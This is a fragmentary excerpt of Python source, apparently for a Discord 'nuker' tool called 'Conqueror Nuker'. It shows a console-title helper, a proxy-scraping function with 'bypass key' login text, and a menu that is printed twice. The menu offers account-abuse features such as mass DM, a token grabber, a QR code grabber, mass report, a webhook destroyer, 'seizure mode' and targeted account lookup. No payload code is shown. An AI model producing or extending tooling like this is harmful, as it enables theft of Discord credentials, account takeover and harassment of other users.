...
def setTitle(_str):
    ...
    if system == 'nt':
        #if its windows
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Made By Sxdd.#0001")
    elif system == 'posix':
        #if its linux
        sys.stdout.write(f"\x1b]0;{_str} | Made By Sxdd.#0001\x07")
    else:
...
def proxy_scrape(): 
    ...
    startTime = time.time()
    #create temp dir
    temp = getTempDir()+"\\sxdd_proxies"
    print(f"{Fore.YELLOW}Login | Bypass by Sxdd.{Fore.RESET}")
    ...
    print(f"{Fore.GREEN}Connect Conqueror | LOGIN WITH BYPASS KEY -- Make by Sxdd.#0001")
    setTitle(f"Conqueror Nuker {THIS_VERSION}")
...
{Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} Create Token Grabber 
{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} QR Code grabber
{Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Report
{Fore.RESET}[{Fore.GREEN}6{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Dm                                     |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.LIGHTBLACK_EX} GroupChat Spammer
{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode                         |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.LIGHTBLACK_EX} Webhook Destroyer
{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.LIGHTBLACK_EX} Get information from a targetted account    |{Fore.RESET}[{Fore.GREEN}17{Fore.RESET}]{Fore.LIGHTBLACK_EX} Settings
{Fore.RESET}[{Fore.GREEN}9{Fore.RESET}]{Fore.LIGHTBLACK_EX} Log into an account                             Thank You For Use
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')
...
[4] Spam Create New servers                     |[13] QR Code grabber
[5] Dm Deleter                                  |[14] Mass Report
[6] Mass Dm                                     |[15] GroupChat Spammer
[7] Enable Seizure Mode                         |[16] Webhook Destroyer
[8] Get information from a targetted account    |[17] Settings
[9] Log into an account                                                         Thank You For Use
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')
